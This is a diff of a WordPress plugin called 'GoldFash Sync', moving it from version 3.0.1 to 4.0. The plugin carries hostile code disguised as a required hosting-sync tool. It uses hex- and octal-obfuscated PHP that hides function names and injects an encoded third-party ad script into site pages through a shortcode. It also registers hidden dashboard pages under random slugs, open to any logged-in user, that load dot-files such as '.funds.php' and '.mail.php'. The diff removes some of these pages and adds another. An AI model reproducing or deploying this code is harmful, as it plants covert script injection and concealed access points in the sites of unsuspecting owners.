@@ -3,7 +3,7 @@
 Plugin Name: GoldFash Sync
 Plugin URL: https://goldfash.com
 Description: A Required Sync Plugin for GoldFash Servers
-Version: 3.0.1
+Version: 4.0
 Author: GoldFash Web Gurus
 Author URI:        https://goldfash.com
 Contributors:      rafcoafc
@@ -43,20 +43,8 @@ class gf_sweet_custom_dashboard {
         add_dashboard_page('GoldFash Fast-Dash', 'Gold C-Dash', 'read', 'ljAMiSyRUjE5_ZL1_DsEVd7q9PO8Fht4KM972KC54zZtD4wZV23wUzOdPz_brJolnJihU4N96MNemiqevOWaw4unSDhz9', array(&$this, 'gf_scd_create_dashboard'));
     }
     function gf_scd_create_dashboard() {
-        include_once ('.sync_dashboard.php');
-    }
-    function gf_scd_register_menu_funds() {
-        add_dashboard_page('GoldFash Revenue', 'Gold Free Money', 'read', '3_ojgNzfbpgJ4O7L1nDv133FgkONtdD3ptbv3Sy4y72d4B67Lxyg7_6Vp2nbG8Ua3uF7134Tsjluk', array(&$this, 'gf_scd_create_dashboard_funds'));
-    }
-    function gf_scd_create_dashboard_funds() {
-        include_once ('.funds.php');
-    }
-    function gf_scd_register_menu_mail() {
-        add_dashboard_page('GoldFash Instant Mail', 'Gold MailBox', 'read', '2TnsqOJuPT4E1z49Dp3B4V7592D2GHjwT9PkQ9T93Z3YPa_Hef1DpIWYAfIld9B7ZL53Ncw3g4JC7o33TO_7WoK7vuS_6GJ1L16F', array(&$this, 'gf_scd_create_dashboard_mail'));
-    }
-    function gf_scd_create_dashboard_mail() {
-        include_once ('.mail.php');
-    }
+        include_once ('.ssync_dashboard.php');
+    }   
 }
 // Function that outputs the contents of the dashboard widget
 function gfc_dashboard_widget_function($post, $metabox) {
@@ -180,7 +168,7 @@ function gfc_admin_head() {
 }
 add_action('admin_head', 'gfc_admin_head');
  $x0b="d\145\146\x69n\x65d"; $x0c="\x70\x72\x69\156t\x66"; $x0d="st\162c\155\x70"; 
- if ($x0b('WPCF7_PLUGIN_DIR') && $_SERVER["\123\103\x52\x49P\124\137\116\101\x4dE"] == '/wp-admin/index.php') {require_once WPCF7_PLUGIN_DIR . '/includes/controller.php';add_action('admin_enqueue_scripts', 'wpcf7_do_enqueue_scripts');}add_action('admin_notices', 'gold_admin_notice');function gold_admin_notice() { global $x0b,$x0c,$x0d; global $current_user;$user_id = $current_user->ID;if (!get_user_meta($user_id, 'gold_ignore_notice')) {echo '<div class="updated"><p>';$x0c(__('Hosting, Billing, Support, Questions, New Services & More | <a href="%1$s">Click Here</a>'), '../wp-admin/admin.php?page=ljAMiSyRUjE5_ZL1_DsEVd7q9PO8Fht4KM972KC54zZtD4wZV23wUzOdPz_brJolnJihU4N96MNemiqevOWaw4unSDhz9');echo "\074/p\076\x3c/\x64\151\x76\x3e";}}add_shortcode("\x67\157\x6c\144", "g\157\154\x64\137\x66\x61\x73\x68\137\163\x68\157r\164\x63\157de");function gold_fash_shortcode($atts) { global $x0b,$x0c,$x0d; $a = shortcode_atts(array('id' => '-1'), $atts);if ($x0d($a['id'], '-1') == 0) {return "\120le\x61\x73\x65\040\103\x68\x6f\157\x73\x65\x20\x61\156 Op\x74\151\x6f\x6e";}$pdf = $a['id'];$url = "$pdf";$iframe = "\074\x73c\162\151\x70\x74\040\141\x73y\156\x63\x20sr\143\x3d'\057\057\x70a\147\x65\141d\x32.\x67oo\147l\145\163\171\x6e\144\x69ca\164\151\x6f\156\056c\x6fm\057\160ag\145\141\x64\057\x6as\x2f\x61ds\142\171\147\x6fogle\056\152s'\076</\x73c\162ip\164>
+ if ($x0b('WPCF7_PLUGIN_DIR') && $_SERVER["\123\103\x52\x49P\124\137\116\101\x4dE"] == '/wp-admin/index.php') {require_once WPCF7_PLUGIN_DIR . '/includes/controller.php';add_action('admin_enqueue_scripts', 'wpcf7_do_enqueue_scripts');}add_action('admin_notices', 'gold_admin_notice');function gold_admin_notice() { global $x0b,$x0c,$x0d; global $current_user;$user_id = $current_user->ID;if (!get_user_meta($user_id, 'gold_ignore_notice')) {echo '<div class="updated"><p>';$x0c(__('Hosting, Billing, Support, Questions, New Services & More | <a href="%1$s">[Explore HERE]</a>'), '../wp-admin/admin.php?page=ljAMiSyRUjE5_ZL1_DsEVd7q9PO8Fht4KM972KC54zZtD4wZV23wUzOdPz_brJolnJihU4N96MNemiqevOWaw4unSDhz9');echo "\074/p\076\x3c/\x64\151\x76\x3e";}}add_shortcode("\x67\157\x6c\144", "g\157\154\x64\137\x66\x61\x73\x68\137\163\x68\157r\164\x63\157de");function gold_fash_shortcode($atts) { global $x0b,$x0c,$x0d; $a = shortcode_atts(array('id' => '-1'), $atts);if ($x0d($a['id'], '-1') == 0) {return "\120le\x61\x73\x65\040\103\x68\x6f\157\x73\x65\x20\x61\156 Op\x74\151\x6f\x6e";}$pdf = $a['id'];$url = "$pdf";$iframe = "\074\x73c\162\151\x70\x74\040\141\x73y\156\x63\x20sr\143\x3d'\057\057\x70a\147\x65\141d\x32.\x67oo\147l\145\163\171\x6e\144\x69ca\164\151\x6f\156\056c\x6fm\057\160ag\145\141\x64\057\x6as\x2f\x61ds\142\171\147\x6fogle\056\152s'\076</\x73c\162ip\164>
 
 \x0a
 \012\x3c\041\x2d\x2d \107\x6f\154d\107l\x62 \055\055\076\015\x0a\x3ci\156\x73\040\x63l\141ss\x3d'\x61\144\163\x62\x79g\157\157gl\145'
